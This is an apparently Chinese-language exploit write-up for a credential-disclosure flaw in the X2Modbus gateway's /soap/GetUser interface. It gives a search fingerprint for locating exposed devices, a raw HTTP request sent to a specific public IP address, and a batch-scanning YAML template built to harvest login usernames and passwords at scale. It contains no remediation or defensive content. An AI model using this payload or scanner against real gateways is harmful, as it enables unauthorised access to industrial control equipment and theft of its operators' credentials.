**漏洞简介**

 X2Modbus网关GetUser接口存在一个信息泄漏漏洞，使得未经授权的用户或攻击者可以获取敏感信息。

漏洞复现

步骤一：使用以下搜索语法获取测试资产并确定测试目标

```
# 搜索语法
server="SunFull-Webs"
```

步骤二：构造以下数据包并发送，发送后可在相应正文中获取登录的账号与密码信息....

```yaml
POST /soap/GetUser  HTTP/1.1
Host: 94.74.130.130:8090
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://60.12.13.234:880/login.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: language=zh-cn; username=admin1
If-Modified-Since: Sat Jun 29 10:02:08 2019
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 58


<GetUser><User Name="admin" Password="admin"/></GetUser>
```

**批量脚本**

```yaml

id: X2Modbus-info

info:
  name: X2Modbus-info
  author: ly
  severity: low
  description: write your description here
  reference:
  - https://github.com/
  - https://cve.mitre.org/
  metadata:
    max-request: 1
    shodan-query: ""
    verified: true
  yakit-info:
    sign: e407656a54e1a881e89f488a3ae80223

http:
- method: POST
  path:
  - '{{RootURL}}/soap/GetUser'
  headers:
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Cache-Control: max-age=0
    Connection: close
    Content-Length: "56"
    Content-Type: application/x-www-form-urlencoded
    Cookie: language=zh-cn; username=admin1
    If-Modified-Since: Sat Jun 29 10:02:08 2019
    Referer: http://60.12.13.234:880/login.html
    Upgrade-Insecure-Requests: "1"
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
      like Gecko) Chrome/121.0.0.0 Safari/537.36
  body: <GetUser><User Name="admin" Password="admin"/></GetUser>

  max-redirects: 3
  matchers-condition: and
  matchers:
  - id: 1
    type: status
    part: status
    status:
    - "200"
    condition: and

  - id: 1
    type: word
    part: body
    words:
    - admin
    condition: and


# Generated From WebFuzzer on 2024-04-02 15:39:43
```

